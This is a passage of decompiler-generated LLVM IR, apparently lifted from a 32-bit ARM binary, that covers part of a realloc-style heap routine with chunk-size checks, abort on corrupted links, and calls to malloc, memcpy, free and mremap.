  %v2_12cc4 = inttoptr i32 %v1_12cc4 to i32*
  %v3_12cc4 = load i32, i32* %v2_12cc4, align 4
  store i32 %v3_12cc4, i32* %r1.global-to-local, align 4
  br i1 %v9_12cc0, label %dec_label_pc_12ccc, label %dec_label_pc_12d08

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12cac
  %v1_12ccc = and i32 %v3_12cc4, -4
  %v2_12cd0 = add i32 %v1_12ccc, %v1_12c98
  store i32 %v2_12cd0, i32* %r1.global-to-local, align 4
  %v1_12cd4 = add i32 %v1_12ca0, 16
  store i32 %v1_12cd4, i32* %r3.global-to-local, align 4
  %v3_12cd8 = icmp ult i32 %v2_12cd0, %v1_12cd4
  br i1 %v3_12cd8, label %dec_label_pc_12d5c, label %dec_label_pc_12ce0

dec_label_pc_12ce0:                               ; preds = %dec_label_pc_12ccc
  %v2_12ce0 = sub i32 %v2_12cd0, %v1_12ca0
  %v1_12ce4 = urem i32 %v3_12c80, 2
  %v2_12ce8 = add i32 %v1_12ca0, %v1_12c94
  store i32 %v2_12ce8, i32* %r1.global-to-local, align 4
  %v2_12cec = or i32 %v1_12ca0, %v1_12ce4
  store i32 %v2_12cec, i32* %r2.global-to-local, align 4
  %v1_12cf0 = or i32 %v2_12ce0, 1
  store i32 %v1_12cf0, i32* %r3.global-to-local, align 4
  store i32 %v0_12c80, i32* @r4, align 4
  store i32 %v2_12cec, i32* %v2_12c80, align 4
  %v0_12cfc = load i32, i32* %r1.global-to-local, align 4
  %v1_12cfc = load i32, i32* %r0.global-to-local, align 4
  %v2_12cfc = add i32 %v1_12cfc, 44
  %v3_12cfc = inttoptr i32 %v2_12cfc to i32*
  store i32 %v0_12cfc, i32* %v3_12cfc, align 4
  %v0_12d00 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d00 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d00 = add i32 %v1_12d00, 4
  %v3_12d00 = inttoptr i32 %v2_12d00 to i32*
  store i32 %v0_12d00, i32* %v3_12d00, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12d08:                               ; preds = %dec_label_pc_12cac
  %v1_12d08 = and i32 %v3_12cc4, -2
  %v2_12d0c = add i32 %v1_12d08, %v2_12cbc
  store i32 %v2_12d0c, i32* %r3.global-to-local, align 4
  %v1_12d10 = add i32 %v2_12d0c, 4
  %v2_12d10 = inttoptr i32 %v1_12d10 to i32*
  %v3_12d10 = load i32, i32* %v2_12d10, align 4
  store i32 %v3_12d10, i32* %r3.global-to-local, align 4
  %v1_12d14 = urem i32 %v3_12d10, 2
  %v2_12d14 = icmp eq i32 %v1_12d14, 0
  br i1 %v2_12d14, label %dec_label_pc_12d1c, label %dec_label_pc_12d5c

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12d08
  %v1_12d1c = and i32 %v3_12cc4, -4
  store i32 %v1_12d1c, i32* %r3.global-to-local, align 4
  %v2_12d20 = add i32 %v1_12d1c, %v1_12c98
  store i32 %v2_12d20, i32* %r0.global-to-local, align 4
  %v3_12d24 = icmp ult i32 %v2_12d20, %v1_12ca0
  br i1 %v3_12d24, label %dec_label_pc_12d5c, label %dec_label_pc_12d2c

dec_label_pc_12d2c:                               ; preds = %dec_label_pc_12d1c
  %v1_12d2c = add i32 %v1_12c98, %v0_12c80
  %v2_12d2c = inttoptr i32 %v1_12d2c to i32*
  %v3_12d2c = load i32, i32* %v2_12d2c, align 4
  store i32 %v3_12d2c, i32* %r1.global-to-local, align 4
  %v1_12d30 = add i32 %v3_12d2c, 12
  %v2_12d30 = inttoptr i32 %v1_12d30 to i32*
  %v3_12d30 = load i32, i32* %v2_12d30, align 4
  store i32 %v3_12d30, i32* %r3.global-to-local, align 4
  %v9_12d34 = icmp eq i32 %v3_12d30, %v2_12cbc
  %v1_12d38 = add i32 %v2_12cbc, 12
  %v2_12d38 = inttoptr i32 %v1_12d38 to i32*
  %v3_12d38 = load i32, i32* %v2_12d38, align 4
  store i32 %v3_12d38, i32* %r2.global-to-local, align 4
  br i1 %v9_12d34, label %dec_label_pc_12d40, label %dec_label_pc_12d4c

dec_label_pc_12d40:                               ; preds = %dec_label_pc_12d2c
  %v1_12d40 = add i32 %v3_12d38, 8
  %v2_12d40 = inttoptr i32 %v1_12d40 to i32*
  %v3_12d40 = load i32, i32* %v2_12d40, align 4
  store i32 %v3_12d40, i32* %r3.global-to-local, align 4
  %v9_12d44 = icmp eq i32 %v3_12d40, %v2_12cbc
  br i1 %v9_12d44, label %dec_label_pc_12d50, label %dec_label_pc_12d4c

dec_label_pc_12d4c:                               ; preds = %dec_label_pc_12d2c, %dec_label_pc_12d40
  %v0_12d4c = call i32 @abort()
  store i32 %v0_12d4c, i32* %r0.global-to-local, align 4
  %v0_12d50.pre = load i32, i32* @r1, align 4
  %v1_12d50.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12d50

dec_label_pc_12d50:                               ; preds = %dec_label_pc_12d40, %dec_label_pc_12d4c
  %v1_12d50 = phi i32 [ %v3_12d38, %dec_label_pc_12d40 ], [ %v1_12d50.pre, %dec_label_pc_12d4c ]
  %v0_12d50 = phi i32 [ %v3_12d2c, %dec_label_pc_12d40 ], [ %v0_12d50.pre, %dec_label_pc_12d4c ]
  %v2_12d50 = add i32 %v1_12d50, 8
  %v3_12d50 = inttoptr i32 %v2_12d50 to i32*
  store i32 %v0_12d50, i32* %v3_12d50, align 4
  %v0_12d54 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d54 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d54 = add i32 %v1_12d54, 12
  %v3_12d54 = inttoptr i32 %v2_12d54 to i32*
  store i32 %v0_12d54, i32* %v3_12d54, align 4
  %v1_12e10.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e10

dec_label_pc_12d5c:                               ; preds = %dec_label_pc_12ccc, %dec_label_pc_12d1c, %dec_label_pc_12d08
  %v1_12d5c = add i32 %v1_12ca0, -7
  store i32 %v1_12d5c, i32* @r0, align 4
  %v0_12d60 = call i32 @malloc()
  store i32 %v0_12d60, i32* @r0, align 4
  store i32 %v0_12d60, i32* %r1.global-to-local, align 4
  %v2_12d64 = icmp eq i32 %v0_12d60, 0
  br i1 %v2_12d64, label %bb31, label %dec_label_pc_12d70

bb31:                                             ; preds = %dec_label_pc_12d5c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12d5c
  %v1_12d78.pre = load i32, i32* @r4, align 4
  %v1_12d70 = add i32 %v0_12d60, -4
  %v2_12d70 = inttoptr i32 %v1_12d70 to i32*
  %v3_12d70 = load i32, i32* %v2_12d70, align 4
  store i32 %v3_12d70, i32* @r3, align 4
  %v1_12d74 = add i32 %v0_12d60, -8
  store i32 %v1_12d74, i32* @r7, align 4
  %v9_12d78 = icmp eq i32 %v1_12d74, %v1_12d78.pre
  br i1 %v9_12d78, label %.thread2, label %dec_label_pc_12d88

.thread2:                                         ; preds = %dec_label_pc_12d70
  %v2_12d7c = and i32 %v3_12d70, -4
  store i32 %v2_12d7c, i32* %r3.global-to-local, align 4
  %v2_12d80 = load i32, i32* @r6, align 4
  %v3_12d80 = add i32 %v2_12d80, %v2_12d7c
  store i32 %v3_12d80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e10

dec_label_pc_12d88:                               ; preds = %dec_label_pc_12d70
  %v0_12d88 = load i32, i32* @r6, align 4
  %v1_12d88 = add i32 %v0_12d88, -4
  store i32 %v1_12d88, i32* @r2, align 4
  %v3_12d8c = udiv i32 %v1_12d88, 4
  store i32 %v3_12d8c, i32* @ip, align 4
  %tmp37 = and i32 %v1_12d88, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_12d94 = icmp ult i32 %v1_12d88, 36
  %v3_12d94 = or i1 %tmp38, %v2_12d94
  %v0_12da4 = load i32, i32* @r5, align 4
  br i1 %v3_12d94, label %dec_label_pc_12da4, label %dec_label_pc_12d98

dec_label_pc_12d98:                               ; preds = %dec_label_pc_12d88
  store i32 %v0_12da4, i32* @r1, align 4
  %v0_12d9c = call i32 @memcpy()
  store i32 %v0_12d9c, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_12da4:                               ; preds = %dec_label_pc_12d88
  %v1_12da4 = inttoptr i32 %v0_12da4 to i32*
  %v2_12da4 = load i32, i32* %v1_12da4, align 4
  store i32 %v2_12da4, i32* %r3.global-to-local, align 4
  %v2_12da8 = inttoptr i32 %v0_12d60 to i32*
  store i32 %v2_12da4, i32* %v2_12da8, align 4
  %v0_12dac = load i32, i32* @r5, align 4
  %v1_12dac = add i32 %v0_12dac, 4
  %v2_12dac = inttoptr i32 %v1_12dac to i32*
  %v3_12dac = load i32, i32* %v2_12dac, align 4
  store i32 %v3_12dac, i32* %r3.global-to-local, align 4
  %v1_12db0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12db0 = add i32 %v1_12db0, 4
  %v3_12db0 = inttoptr i32 %v2_12db0 to i32*
  store i32 %v3_12dac, i32* %v3_12db0, align 4
  %v0_12db4 = load i32, i32* @r5, align 4
  %v1_12db4 = add i32 %v0_12db4, 8
  %v2_12db4 = inttoptr i32 %v1_12db4 to i32*
  %v3_12db4 = load i32, i32* %v2_12db4, align 4
  store i32 %v3_12db4, i32* %r3.global-to-local, align 4
  %v0_12db8 = load i32, i32* @ip, align 4
  %v1_12dbc = load i32, i32* %r1.global-to-local, align 4
  %v2_12dbc = add i32 %v1_12dbc, 8
  %v3_12dbc = inttoptr i32 %v2_12dbc to i32*
  store i32 %v3_12db4, i32* %v3_12dbc, align 4
  %tmp39 = icmp ult i32 %v0_12db8, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %dec_label_pc_12da4
  %v0_12dc4 = load i32, i32* @r5, align 4
  %v1_12dc4 = add i32 %v0_12dc4, 12
  %v2_12dc4 = inttoptr i32 %v1_12dc4 to i32*
  %v3_12dc4 = load i32, i32* %v2_12dc4, align 4
  store i32 %v3_12dc4, i32* %r3.global-to-local, align 4
  %v1_12dc8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12dc8 = add i32 %v1_12dc8, 12
  %v3_12dc8 = inttoptr i32 %v2_12dc8 to i32*
  store i32 %v3_12dc4, i32* %v3_12dc8, align 4
  %v0_12dcc = load i32, i32* @r5, align 4
  %v1_12dcc = add i32 %v0_12dcc, 16
  %v2_12dcc = inttoptr i32 %v1_12dcc to i32*
  %v3_12dcc = load i32, i32* %v2_12dcc, align 4
  store i32 %v3_12dcc, i32* %r3.global-to-local, align 4
  %v0_12dd0 = load i32, i32* @ip, align 4
  %v1_12dd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12dd4 = add i32 %v1_12dd4, 16
  %v3_12dd4 = inttoptr i32 %v2_12dd4 to i32*
  store i32 %v3_12dcc, i32* %v3_12dd4, align 4
  %tmp40 = icmp ult i32 %v0_12dd0, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_12ddc

dec_label_pc_12ddc:                               ; preds = %dec_label_pc_12dc4
  %v0_12ddc = load i32, i32* @r5, align 4
  %v1_12ddc = add i32 %v0_12ddc, 20
  %v2_12ddc = inttoptr i32 %v1_12ddc to i32*
  %v3_12ddc = load i32, i32* %v2_12ddc, align 4
  store i32 %v3_12ddc, i32* %r3.global-to-local, align 4
  %v1_12de0 = load i32, i32* %r1.global-to-local, align 4
  %v2_12de0 = add i32 %v1_12de0, 20
  %v3_12de0 = inttoptr i32 %v2_12de0 to i32*
  store i32 %v3_12ddc, i32* %v3_12de0, align 4
  %v0_12de4 = load i32, i32* @r5, align 4
  %v1_12de4 = add i32 %v0_12de4, 24
  %v2_12de4 = inttoptr i32 %v1_12de4 to i32*
  %v3_12de4 = load i32, i32* %v2_12de4, align 4
  store i32 %v3_12de4, i32* %r3.global-to-local, align 4
  %v1_12de8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12de8 = add i32 %v1_12de8, 24
  %v3_12de8 = inttoptr i32 %v2_12de8 to i32*
  store i32 %v3_12de4, i32* %v3_12de8, align 4
  %v0_12dec = load i32, i32* @ip, align 4
  %v7_12dec = icmp eq i32 %v0_12dec, 9
  br i1 %v7_12dec, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_12ddc
  %v1_12df0 = load i32, i32* @r5, align 4
  %v2_12df0 = add i32 %v1_12df0, 28
  %v3_12df0 = inttoptr i32 %v2_12df0 to i32*
  %v4_12df0 = load i32, i32* %v3_12df0, align 4
  store i32 %v4_12df0, i32* %r3.global-to-local, align 4
  %v2_12df4 = load i32, i32* %r1.global-to-local, align 4
  %v3_12df4 = add i32 %v2_12df4, 28
  %v4_12df4 = inttoptr i32 %v3_12df4 to i32*
  store i32 %v4_12df0, i32* %v4_12df4, align 4
  %v1_12df8 = load i32, i32* @r5, align 4
  %v2_12df8 = add i32 %v1_12df8, 32
  %v3_12df8 = inttoptr i32 %v2_12df8 to i32*
  %v4_12df8 = load i32, i32* %v3_12df8, align 4
  store i32 %v4_12df8, i32* %r3.global-to-local, align 4
  %v2_12dfc = load i32, i32* %r1.global-to-local, align 4
  %v3_12dfc = add i32 %v2_12dfc, 32
  %v4_12dfc = inttoptr i32 %v3_12dfc to i32*
  store i32 %v4_12df8, i32* %v4_12dfc, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12ddc, %dec_label_pc_12dc4, %dec_label_pc_12da4, %dec_label_pc_12d98, %bb32
  %v0_12e00 = load i32, i32* @r5, align 4
  store i32 %v0_12e00, i32* @r0, align 4
  %v0_12e04 = call i32 @free()
  store i32 %v0_12e04, i32* %r0.global-to-local, align 4
  %v0_12e08 = load i32, i32* @r7, align 4
  %v1_12e08 = add i32 %v0_12e08, 8
  store i32 %v1_12e08, i32* @r4, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12e10:                               ; preds = %bb30, %.thread2, %dec_label_pc_12d50
  %v0_12e24 = phi i32 [ %v3_12d80, %.thread2 ], [ %v1_12c98, %bb30 ], [ %v1_12e10.pre, %dec_label_pc_12d50 ]
  %v0_12e10 = load i32, i32* @sb, align 4
  %v2_12e10 = sub i32 %v0_12e24, %v0_12e10
  store i32 %v2_12e10, i32* %r1.global-to-local, align 4
  %v0_12e18 = load i32, i32* @sl, align 4
  %v1_12e18 = add i32 %v0_12e18, 4
  %v2_12e18 = inttoptr i32 %v1_12e18 to i32*
  %v3_12e18 = load i32, i32* %v2_12e18, align 4
  %tmp41 = icmp ugt i32 %v2_12e10, 15
  %v1_12e40 = urem i32 %v3_12e18, 2
  store i32 %v1_12e40, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_12e40, label %dec_label_pc_12e20

dec_label_pc_12e20:                               ; preds = %dec_label_pc_12e10
  %v2_12e24 = or i32 %v1_12e40, %v0_12e24
  store i32 %v2_12e24, i32* %r3.global-to-local, align 4
  store i32 %v2_12e24, i32* %v2_12e18, align 4
  %v0_12e2c = load i32, i32* @sl, align 4
  %v1_12e2c = load i32, i32* %r0.global-to-local, align 4
  %v2_12e2c = add i32 %v1_12e2c, %v0_12e2c
  store i32 %v2_12e2c, i32* %r2.global-to-local, align 4
  %v1_12e30 = add i32 %v2_12e2c, 4
  %v2_12e30 = inttoptr i32 %v1_12e30 to i32*
  %v3_12e30 = load i32, i32* %v2_12e30, align 4
  %v1_12e34 = or i32 %v3_12e30, 1
  store i32 %v1_12e34, i32* %r3.global-to-local, align 4
  store i32 %v1_12e34, i32* %v2_12e30, align 4
  br label %dec_label_pc_12e70

dec_label_pc_12e40:                               ; preds = %dec_label_pc_12e10
  %v2_12e44 = add i32 %v0_12e18, %v0_12e10
  store i32 %v2_12e44, i32* %r0.global-to-local, align 4
  %v2_12e48 = or i32 %v1_12e40, %v0_12e10
  store i32 %v2_12e48, i32* %r3.global-to-local, align 4
  %v1_12e4c = or i32 %v2_12e10, 1
  store i32 %v1_12e4c, i32* %r2.global-to-local, align 4
  store i32 %v2_12e48, i32* %v2_12e18, align 4
  %v0_12e54 = load i32, i32* %r2.global-to-local, align 4
  %v1_12e54 = load i32, i32* %r0.global-to-local, align 4
  %v2_12e54 = add i32 %v1_12e54, 4
  %v3_12e54 = inttoptr i32 %v2_12e54 to i32*
  store i32 %v0_12e54, i32* %v3_12e54, align 4
  %v0_12e58 = load i32, i32* %r0.global-to-local, align 4
  %v1_12e58 = load i32, i32* %r1.global-to-local, align 4
  %v2_12e58 = add i32 %v1_12e58, %v0_12e58
  store i32 %v2_12e58, i32* %r2.global-to-local, align 4
  %v1_12e5c = add i32 %v2_12e58, 4
  %v2_12e5c = inttoptr i32 %v1_12e5c to i32*
  %v3_12e5c = load i32, i32* %v2_12e5c, align 4
  %v1_12e60 = or i32 %v3_12e5c, 1
  store i32 %v1_12e60, i32* %r3.global-to-local, align 4
  store i32 %v1_12e60, i32* %v2_12e5c, align 4
  %v0_12e68 = load i32, i32* %r0.global-to-local, align 4
  %v1_12e68 = add i32 %v0_12e68, 8
  store i32 %v1_12e68, i32* @r0, align 4
  %v0_12e6c = call i32 @free()
  store i32 %v0_12e6c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e70

dec_label_pc_12e70:                               ; preds = %dec_label_pc_12e20, %dec_label_pc_12e40
  %v0_12e70 = load i32, i32* @sl, align 4
  %v1_12e70 = add i32 %v0_12e70, 8
  store i32 %v1_12e70, i32* @r4, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12e78:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r1.global-to-local, align 4
  %v4_12e80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 64) to i32*), align 4
  store i32 %v4_12e80, i32* @r8, align 4
  %v2_12e84 = inttoptr i32 %v1_12c94 to i32*
  %v3_12e84 = load i32, i32* %v2_12e84, align 4
  store i32 %v3_12e84, i32* @r4, align 4
  %v1_12e88 = add i32 %v4_12e80, 860
  %v2_12e88 = inttoptr i32 %v1_12e88 to i32*
  %v3_12e88 = load i32, i32* %v2_12e88, align 4
  %v1_12e8c = add i32 %v3_12e84, 4
  %v1_12e90 = add i32 %v3_12e88, -1
  store i32 %v1_12e90, i32* %r2.global-to-local, align 4
  %v2_12e94 = add i32 %v1_12e8c, %v1_12e90
  %v1_12e98 = load i32, i32* @sb, align 4
  %v2_12e98 = add i32 %v2_12e94, %v1_12e98
  store i32 %v2_12e98, i32* %r3.global-to-local, align 4
  %v2_12e9c = sub i32 0, %v3_12e88
  %v3_12e9c = and i32 %v2_12e98, %v2_12e9c
  store i32 %v3_12e9c, i32* @r7, align 4
  %v2_12ea0 = sub i32 %v3_12e9c, %v3_12e84
  store i32 %v2_12ea0, i32* @fp, align 4
  %v9_12ea4 = icmp eq i32 %v1_12c98, %v2_12ea0
  br i1 %v9_12ea4, label %dec_label_pc_12f18, label %dec_label_pc_12eac

dec_label_pc_12eac:                               ; preds = %dec_label_pc_12e78
  %v2_12eac = sub i32 %v1_12c94, %v3_12e84
  store i32 %v2_12eac, i32* %r0.global-to-local, align 4
  %v2_12eb0 = add i32 %v3_12e84, %v1_12c98
  store i32 %v2_12eb0, i32* %r1.global-to-local, align 4
  store i32 %v3_12e9c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_12ebc = call i32 @mremap(i32 %v2_12eac, i32 %v2_12eb0, i32 %v3_12e9c, i32 1)
  store i32 %v4_12ebc, i32* %r0.global-to-local, align 4
  %v7_12ec0 = icmp eq i32 %v4_12ebc, -1
  br i1 %v7_12ec0, label %dec_label_pc_12f0c, label %dec_label_pc_12ec8

dec_label_pc_12ec8:                               ; preds = %dec_label_pc_12eac
  %v1_12ec8 = load i32, i32* @r4, align 4
  %v2_12ec8 = add i32 %v1_12ec8, %v4_12ebc
  store i32 %v2_12ec8, i32* %r0.global-to-local, align 4
  %v0_12ecc = load i32, i32* @fp, align 4
  %v1_12ecc = or i32 %v0_12ecc, 2
  store i32 %v1_12ecc, i32* %r3.global-to-local, align 4
  %v2_12ed0 = add i32 %v2_12ec8, 4
  %v3_12ed0 = inttoptr i32 %v2_12ed0 to i32*
  store i32 %v1_12ecc, i32* %v3_12ed0, align 4
  %v0_12ed4 = load i32, i32* @r8, align 4
  %v1_12ed4 = add i32 %v0_12ed4, 868
  %v2_12ed4 = inttoptr i32 %v1_12ed4 to i32*
  %v3_12ed4 = load i32, i32* %v2_12ed4, align 4
  store i32 %v3_12ed4, i32* %r3.global-to-local, align 4
  %v1_12ed8 = add i32 %v0_12ed4, 880
  %v2_12ed8 = inttoptr i32 %v1_12ed8 to i32*
  %v3_12ed8 = load i32, i32* %v2_12ed8, align 4
  store i32 %v3_12ed8, i32* %r2.global-to-local, align 4
  %v0_12edc = load i32, i32* @r6, align 4
  %v2_12edc = sub i32 %v3_12ed4, %v0_12edc
  store i32 %v2_12edc, i32* %r3.global-to-local, align 4
  %v1_12ee0 = load i32, i32* @r7, align 4
  %v2_12ee0 = add i32 %v1_12ee0, %v2_12edc
  store i32 %v2_12ee0, i32* %r1.global-to-local, align 4
  %v1_12ee4 = add i32 %v0_12ed4, 872
  %v2_12ee4 = inttoptr i32 %v1_12ee4 to i32*
  %v3_12ee4 = load i32, i32* %v2_12ee4, align 4
  store i32 %v3_12ee4, i32* %r3.global-to-local, align 4
  %v1_12eec = add i32 %v0_12ed4, 884
  %v2_12eec = inttoptr i32 %v1_12eec to i32*
  %v3_12eec = load i32, i32* %v2_12eec, align 4
  store i32 %v3_12eec, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12ee0, %v3_12ed8
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12ec8
  store i32 %v2_12ee0, i32* %v2_12ed8, align 4
  %v0_12ef4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12ef4.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12ec8, %bb33
  %v1_12ef4 = phi i32 [ %v0_12ed4, %dec_label_pc_12ec8 ], [ %v1_12ef4.pre, %bb33 ]
  %v0_12ef4 = phi i32 [ %v2_12ee0, %dec_label_pc_12ec8 ], [ %v0_12ef4.pre, %bb33 ]
  %v2_12ef4 = add i32 %v1_12ef4, 868
  %v3_12ef4 = inttoptr i32 %v2_12ef4 to i32*
  store i32 %v0_12ef4, i32* %v3_12ef4, align 4
  %v0_12ef8 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ef8 = load i32, i32* %r3.global-to-local, align 4
  %v2_12ef8 = add i32 %v1_12ef8, %v0_12ef8
  store i32 %v2_12ef8, i32* %r1.global-to-local, align 4
  %v1_12efc = load i32, i32* %r2.global-to-local, align 4
  %v0_12f00 = load i32, i32* %r0.global-to-local, align 4
  %v1_12f00 = add i32 %v0_12f00, 8
  store i32 %v1_12f00, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_12ef8, %v1_12efc
  br i1 %tmp43, label %bb35, label %dec_label_pc_12f44

bb35:                                             ; preds = %bb34
  %v5_12f04 = load i32, i32* @r8, align 4
  %v6_12f04 = add i32 %v5_12f04, 884
  %v7_12f04 = inttoptr i32 %v6_12f04 to i32*
  store i32 %v2_12ef8, i32* %v7_12f04, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12f0c:                               ; preds = %dec_label_pc_12eac
  %v0_12f0c = load i32, i32* @sb, align 4
  %v1_12f0c = add i32 %v0_12f0c, 4
  store i32 %v1_12f0c, i32* %r3.global-to-local, align 4
  %v0_12f10 = load i32, i32* @r6, align 4
  %v3_12f10 = icmp ult i32 %v0_12f10, %v1_12f0c
  br i1 %v3_12f10, label %dec_label_pc_12f20, label %dec_label_pc_12f0c.dec_label_pc_12f18_crit_edge

dec_label_pc_12f0c.dec_label_pc_12f18_crit_edge:  ; preds = %dec_label_pc_12f0c
  %v0_12f18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12f18

dec_label_pc_12f18:                               ; preds = %dec_label_pc_12f0c.dec_label_pc_12f18_crit_edge, %dec_label_pc_12e78
  %v0_12f18 = phi i32 [ %v0_12f18.pre, %dec_label_pc_12f0c.dec_label_pc_12f18_crit_edge ], [ %v0_12c80, %dec_label_pc_12e78 ]
  store i32 %v0_12f18, i32* @r4, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12f20:                               ; preds = %dec_label_pc_12f0c
  %v1_12f20 = add i32 %v0_12f0c, -7
  store i32 %v1_12f20, i32* @r0, align 4
  %v0_12f24 = call i32 @malloc()
  store i32 %v0_12f24, i32* @r0, align 4
  store i32 %v0_12f24, i32* @r4, align 4
  %v2_12f28 = icmp eq i32 %v0_12f24, 0
  br i1 %v2_12f28, label %dec_label_pc_12f44, label %dec_label_pc_12f30

dec_label_pc_12f30:                               ; preds = %dec_label_pc_12f20
  %v0_12f30 = load i32, i32* @r6, align 4
  %v1_12f30 = add i32 %v0_12f30, -8
  store i32 %v1_12f30, i32* @r2, align 4
  %v0_12f34 = load i32, i32* @r5, align 4
  store i32 %v0_12f34, i32* @r1, align 4
  %v0_12f38 = call i32 @memcpy()
  %v0_12f3c = load i32, i32* @r5, align 4
  store i32 %v0_12f3c, i32* @r0, align 4
  %v0_12f40 = call i32 @free()
  store i32 %v0_12f40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12f44:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_12f20, %dec_label_pc_12f18, %dec_label_pc_12e70, %.thread6, %dec_label_pc_12ce0, %dec_label_pc_12f30
  store i32 %v2_12c2c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r2.global-to-local, align 4
  %v4_12f54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22010.349 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12f54)
  br label %dec_label_pc_12f60

dec_label_pc_12f60:                               ; preds = %dec_label_pc_12c60, %dec_label_pc_12c08, %dec_label_pc_12bf0, %dec_label_pc_12f44
  %v0_12f60 = load i32, i32* @r4, align 4
  store i32 %v0_12f60, i32* %r0.global-to-local, align 4
  store i32 %v3_12bd0, i32* @r4, align 4
  store i32 %v6_12bd0, i32* @r5, align 4
  store i32 %v9_12bd0, i32* @r6, align 4
  store i32 %v12_12bd0, i32* @r7, align 4
  store i32 %v15_12bd0, i32* @r8, align 4
  store i32 %v18_12bd0, i32* @sb, align 4
  store i32 %v21_12bd0, i32* @sl, align 4
  store i32 %v24_12bd0, i32* @fp, align 4
  store i32 %v27_12bd0, i32* @lr, align 4
  ret i32 %v0_12f60

; uselistorder directives
  uselistorder i32 %v2_12ef8, { 1, 0, 2 }
  uselistorder i32 %v2_12ee0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12ebc, { 1, 0, 2 }
  uselistorder i32 %v3_12e9c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12e40, { 2, 1, 0 }
  uselistorder i32 %v2_12e10, { 1, 0, 2 }
  uselistorder i32 %v0_12da4, { 1, 0 }
  uselistorder i32 %v0_12d60, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_12cc4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12cbc, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12ca0, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12c98, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_12c94, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_12c84, { 1, 0 }
  uselistorder i32 %v0_12c80, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12c58, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12f60, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12f44, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_12e70, { 1, 0 }
  uselistorder label %dec_label_pc_12e10, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_12d5c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12d50, { 1, 0 }
  uselistorder label %dec_label_pc_12d4c, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_12f74(i32 %arg1) local_unnamed_addr {
dec_label_pc_12f74:
  %v0_12f74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12f74, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_12f74
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12f74, %bb
